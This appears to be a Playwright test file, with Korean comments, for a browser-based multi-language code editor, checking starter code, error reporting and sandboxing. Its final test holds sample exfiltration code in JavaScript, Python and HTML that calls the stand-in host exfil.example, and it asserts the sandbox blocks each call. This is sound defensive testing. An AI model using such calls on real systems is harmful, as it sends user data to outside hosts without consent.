import type { Page } from '@playwright/test';
import { dismissToasts, expect, expectDashboard, signUpViaEmail, test, uniqueEmail } from './fixtures';

/*
 * 코드 편집기 — 언어별 점검
 *  - 언어를 바꾸면 아직 고치지 않은 시작 코드가 그 언어의 주석 · 예시로 바뀌고, 그대로 실행 · 미리보기 · 검사가 된다
 *  - 사용자가 고친 내용은 언어를 바꿔도 그대로 남는다
 *  - 실행 오류는 사용자 파일의 줄 번호와 함께 보이고, 내부(Pyodide 등) 호출 줄은 보이지 않는다
 */

test.describe.configure({ timeout: 240_000 });

async function openCodeWorkspace(page: Page, name: string) {
  await page.goto('/');
  await signUpViaEmail(page, uniqueEmail('code'), name);
  await expectDashboard(page, name);
  await dismissToasts(page);
  await page.getByRole('button', { name: '새 템플릿' }).first().click();
  const dialog = page.getByRole('dialog').filter({ hasText: '새 템플릿 만들기' });
  await dialog.getByPlaceholder('예) 신규 서비스 런칭').fill(`코드 점검 ${Date.now().toString(36)}`);
  await dialog.locator('button.feature-card.feature-code').click();
  await dialog.getByRole('button', { name: '만들기', exact: true }).click();
  await page.waitForURL(/\/t\/[A-Za-z0-9_-]+/);
  await page.getByText('main.js').first().click();
  await expect(page.locator('.code-module .cm-content')).toContainText('console.log');
}

const editor = (page: Page) => page.locator('.code-module .cm-content');
const output = (page: Page) => page.locator('.code-panel');

async function chooseLanguage(page: Page, name: string) {
  await dismissToasts(page);
  await page.locator('button.lang-select').click();
  await page.getByRole('menuitem', { name: new RegExp(`^${name.replace(/[+#]/g, '\\$&')}\\s*(\\.\\w+)?$`) }).click();
  await expect(page.locator('button.lang-select')).toHaveText(name);
}

async function replaceCode(page: Page, code: string) {
  await editor(page).click();
  await page.keyboard.press('ControlOrMeta+a');
  await page.keyboard.press('Delete');
  await page.keyboard.insertText(code);
  await expect(editor(page)).toContainText(code.split('\n')[0]);
}

async function run(page: Page) {
  await page.locator('.code-module .module-toolbar').getByRole('button', { name: /^(실행|미리보기|검사|CSS로 변환)$/ }).click();
}

/** 실행이 끝날 때까지 (완료 · 오류 줄이 나올 때까지) */
async function runAndWait(page: Page, done: RegExp = /✓ 실행 완료|■ 오류로 종료|■ 실행 중 오류/) {
  await run(page);
  await expect(output(page)).toContainText(done, { timeout: 120_000 });
  return (await output(page).innerText()).trim();
}

test('언어를 바꾸면 시작 코드가 그 언어에 맞게 바뀌고 그대로 실행된다', async ({ page }) => {
  await openCodeWorkspace(page, '코더');

  // 실행되는 언어: 시작 코드 첫 줄이 그 언어의 주석이고, 실행하면 Hello, Madang! 이 나온다
  const runnable: [name: string, comment: string][] = [
    ['JavaScript', '// 함께 코딩해 보세요!'],
    ['TypeScript', '// 함께 코딩해 보세요!'],
    ['Python', '# 함께 코딩해 보세요!'],
    ['SQL', '-- 함께 코딩해 보세요!'],
    ['Lua', '-- 함께 코딩해 보세요!'],
    ['Ruby', '# 함께 코딩해 보세요!'],
    ['PHP', '<?php'],
  ];
  for (const [name, comment] of runnable) {
    await chooseLanguage(page, name);
    await expect(editor(page)).toContainText(comment);
    await expect(editor(page)).toContainText(`${name} 코드를 바로 실행`);
    const text = await runAndWait(page);
    expect(text, `${name} 실행 결과`).toContain('Hello, Madang!');
    expect(text, `${name} 실행 결과`).toContain('✓ 실행 완료');
    expect(text, `${name} 실행 결과`).not.toMatch(/Error|오류/);
  }

  // 검사 · 변환
  await chooseLanguage(page, 'JSON');
  await expect(editor(page)).toContainText('"message": "Hello, Madang!"');
  expect(await runAndWait(page, /올바른 JSON|JSON 형식 오류/)).toContain('✓ 올바른 JSON입니다');
  await chooseLanguage(page, 'YAML');
  await expect(editor(page)).toContainText('# 함께 작성해 보세요!');
  expect(await runAndWait(page, /올바른 YAML|YAML 형식 오류/)).toContain('✓ 올바른 YAML입니다');
  await chooseLanguage(page, 'SCSS');
  await expect(editor(page)).toContainText('$brand');
  expect(await runAndWait(page, /CSS로 변환했습니다|Error/)).toContain('color: #6366f1');

  // 미리보기: JSX · TSX(React) · Markdown · HTML
  for (const [name, heading] of [
    ['JSX', 'Hello, Madang!'],
    ['TSX', 'Hello, Madang!'],
    ['Markdown', 'Hello, Madang!'],
    ['HTML', 'Hello, Madang!'],
  ] as const) {
    await chooseLanguage(page, name);
    await run(page);
    const frame = page.frameLocator('iframe.code-preview').first();
    await expect(frame.locator('h1'), `${name} 미리보기`).toHaveText(heading, { timeout: 60_000 });
  }

  // 사이트 안에서 실행할 수 없는 언어: 시작 코드는 그 언어의 예시, 실행하면 안내
  for (const [name, snippet] of [
    ['Java', 'System.out.println("Hello, Madang!")'],
    ['C', 'printf("Hello, Madang!\\n")'],
    ['Go', 'fmt.Println("Hello, Madang!")'],
    ['Rust', 'println!("Hello, Madang!")'],
    ['Shell', 'echo "Hello, Madang!"'],
  ] as const) {
    await chooseLanguage(page, name);
    await expect(editor(page)).toContainText(snippet);
    await run(page);
    await expect(output(page)).toContainText('아직 사이트 안에서 실행할 수 없습니다');
  }

  // 파일 이름 확장자도 따라 바뀐다
  await chooseLanguage(page, 'Python');
  await expect(page.locator('.code-module .file-tab.is-active .file-tab-name')).toContainText('main.py');
});

test('고친 코드는 언어를 바꿔도 그대로 두고, 오류는 사용자 파일 기준으로 보여 준다', async ({ page }) => {
  await openCodeWorkspace(page, '디버거');

  // 파일 이름의 확장자를 바꿔도 (main.js → main.rb) 시작 코드가 그 언어로 바뀐다
  await page.locator('.code-module .file-tab.is-active .file-tab-name').dblclick();
  await page.keyboard.press('ControlOrMeta+a');
  await page.keyboard.insertText('main.rb');
  await page.keyboard.press('Enter');
  await expect(page.locator('button.lang-select')).toHaveText('Ruby');
  await expect(editor(page)).toContainText("puts 'Hello, Madang!'");

  // 사용자가 고친 내용은 덮어쓰지 않는다
  await replaceCode(page, "console.log('mine');");
  await chooseLanguage(page, 'Python');
  await expect(editor(page)).toHaveText("console.log('mine');");

  // 파이썬: 예외 → 파일 이름 · 줄 번호는 보이고 Pyodide 내부 줄은 보이지 않는다
  await replaceCode(page, 'x = 1\nprint(x / 0)');
  let text = await runAndWait(page);
  expect(text).toContain('File "main.py", line 2');
  expect(text).toContain('ZeroDivisionError');
  expect(text).not.toContain('_pyodide');
  expect(text).not.toContain('/lib/python');

  // 파이썬 문법 오류
  await replaceCode(page, 'print("a"\n');
  text = await runAndWait(page);
  expect(text).toContain('SyntaxError');
  expect(text).not.toContain('_pyodide');

  // 파이썬 input(): 입력 칸의 값을 읽는다
  await replaceCode(page, 'name = input()\nprint("hi", name)');
  await page.getByRole('button', { name: /입력값/ }).click();
  await page.locator('.code-panel textarea').fill('madang');
  text = await runAndWait(page);
  expect(text).toContain('hi madang');

  // JavaScript: 던진 오류는 파일 이름 · 줄 번호와 함께
  await chooseLanguage(page, 'JavaScript');
  await replaceCode(page, 'const a = 1;\nnull.x;');
  text = await runAndWait(page);
  expect(text).toMatch(/TypeError: .*\(main\.js:2\)/);

  // JavaScript: 실행이 끝난 뒤에 도는 setTimeout · setInterval 출력도 기다렸다가 보여 준다
  await replaceCode(page, 'let n = 0;\nconst id = setInterval(() => { console.log("tick"); if (++n === 2) clearInterval(id); }, 30);\nsetTimeout(() => console.log("later"), 150);');
  text = await runAndWait(page);
  expect(text).toMatch(/tick\s+tick\s+later\s+✓ 실행 완료/);

  // TypeScript 문법 오류
  await chooseLanguage(page, 'TypeScript');
  await replaceCode(page, 'const a: number = ;');
  text = await runAndWait(page);
  expect(text).toContain('SyntaxError');
  expect(text).toContain('main.ts:1');

  // SQL: 잘못된 문장은 몇 번째 문장인지 알려 준다
  await chooseLanguage(page, 'SQL');
  await replaceCode(page, "SELECT 1;\nSELEC 2;");
  text = await runAndWait(page);
  expect(text).toMatch(/오류|error/i);

  expect(text).toContain('2번째 문장에서 오류');

  // Lua · Ruby · PHP 런타임 오류 — 사용자 파일 기준 줄 번호만, 내부 실행 줄(dofile · Kernel#load)은 감춘다
  await chooseLanguage(page, 'Lua');
  await replaceCode(page, "local t = nil\nprint(t.x)");
  text = await runAndWait(page);
  expect(text).toContain('main.lua:2: attempt to index a nil value');
  expect(text).not.toMatch(/dofile|\/app\//);
  await chooseLanguage(page, 'Ruby');
  await replaceCode(page, "nil.foo");
  text = await runAndWait(page);
  expect(text).toContain("main.rb:1:in '<top (required)>': undefined method 'foo' for nil (NoMethodError)");
  expect(text).not.toMatch(/Kernel#load|Kernel\.eval|\/app\//);
  await chooseLanguage(page, 'PHP');
  await replaceCode(page, '<?php\nthrow new Exception("boom");');
  expect(await runAndWait(page)).toContain('boom');

  // 일반 텍스트: 실행할 수 없다는 안내 (컴파일 언어 안내가 아니라)
  await chooseLanguage(page, '일반 텍스트');
  await run(page);
  await expect(output(page)).toContainText('일반 텍스트 파일은 실행할 수 없습니다');
});

test('JSX 미리보기에서 그리는 중에 난 오류를 빈 화면 대신 보여 준다', async ({ page, errors }) => {
  await openCodeWorkspace(page, '리액트');
  await chooseLanguage(page, 'JSX');
  await replaceCode(page, 'export default function App() {\n  return <div>{undefinedVar}</div>;\n}');
  await run(page);
  await expect(page.frameLocator('iframe.code-preview').locator('pre')).toContainText('undefinedVar is not defined', { timeout: 60_000 });
  // 미리보기 안의 오류는 의도한 것이라 콘솔 오류 검사에서 뺀다
  errors.list.splice(0, errors.list.length, ...errors.list.filter((e) => !e.includes('undefinedVar')));
});

test('실행 · 미리보기 코드는 바깥 서버로 데이터를 보낼 수 없다', async ({ page, context, errors }) => {
  // 보안 정책이 없다면 이 주소로 가는 요청이 성공한다 — 한 번도 닿지 않아야 한다
  const leaked: string[] = [];
  await context.route(/^https:\/\/exfil\.example\//, (route) => {
    leaked.push(route.request().url());
    return route.fulfill({ status: 200, contentType: 'text/plain', body: 'ok', headers: { 'access-control-allow-origin': '*' } });
  });
  await openCodeWorkspace(page, '보안');

  // JavaScript 실행: fetch · XHR · WebSocket 모두 막힌다
  await replaceCode(
    page,
    [
      "for (const f of [() => fetch('https://exfil.example/fetch?d=secret'), () => new Promise((ok, no) => { const x = new XMLHttpRequest(); x.open('GET', 'https://exfil.example/xhr'); x.onload = ok; x.onerror = no; x.send(); })]) {",
      "  try { await f(); console.log('LEAKED'); } catch { console.log('BLOCKED'); }",
      '}',
      "await new Promise((done) => { try { const ws = new WebSocket('wss://exfil.example/ws'); ws.onopen = () => { console.log('WS OPENED'); done(); }; ws.onerror = () => { console.log('BLOCKED'); done(); }; } catch { console.log('BLOCKED'); done(); } });",
    ].join('\n'),
  );
  let text = await runAndWait(page);
  expect(text).not.toContain('LEAKED');
  expect(text).not.toContain('WS OPENED');
  expect(text.match(/BLOCKED/g)?.length).toBe(3);

  // 파이썬 실행: pyodide의 JS 연결(js.fetch)로도 못 보낸다
  await chooseLanguage(page, 'Python');
  await replaceCode(page, "import js\ntry:\n    await js.fetch('https://exfil.example/py')\n    print('LEAKED')\nexcept Exception:\n    print('BLOCKED')");
  text = await runAndWait(page);
  expect(text).toContain('BLOCKED');
  expect(text).not.toContain('LEAKED');
  // 추가 패키지(numpy 등)를 받는 Pyodide CDN 주소는 열려 있다 (테스트에서는 빈 응답으로 대신한다)
  await replaceCode(page, "import js\nr = await js.fetch('https://cdn.jsdelivr.net/pyodide/v0/full/numpy.whl')\nprint('CDN', r.status)");
  expect(await runAndWait(page)).toContain('CDN 200');

  // HTML 미리보기: fetch · 폼 전송이 막힌다 (doctype 앞 · head 밖에 둔 스크립트도)
  await chooseLanguage(page, 'HTML');
  await replaceCode(
    page,
    "<script>fetch('https://exfil.example/early').then(() => console.log('LEAKED'), () => console.log('BLOCKED-EARLY'))</script>\n<h1>보안</h1>\n<script>navigator.sendBeacon && navigator.sendBeacon('https://exfil.example/beacon', 'x'); fetch('https://exfil.example/late').then(() => console.log('LEAKED'), () => console.log('BLOCKED-LATE'))</script>",
  );
  await run(page);
  await expect(page.frameLocator('iframe.code-preview').locator('h1')).toHaveText('보안', { timeout: 30_000 });
  if (!(await output(page).isVisible())) await page.getByRole('button', { name: '출력 패널' }).click();
  await expect(output(page)).toContainText('BLOCKED-EARLY');
  await expect(output(page)).toContainText('BLOCKED-LATE');
  expect(await output(page).innerText()).not.toContain('LEAKED');

  expect(leaked, '바깥 서버에 닿은 요청').toEqual([]);
  // 보안 정책 위반 경고는 의도한 것이라 콘솔 오류 검사에서 뺀다
  errors.list.splice(0, errors.list.length, ...errors.list.filter((e) => !/exfil\.example|Content Security Policy|Failed to fetch/.test(e)));
});
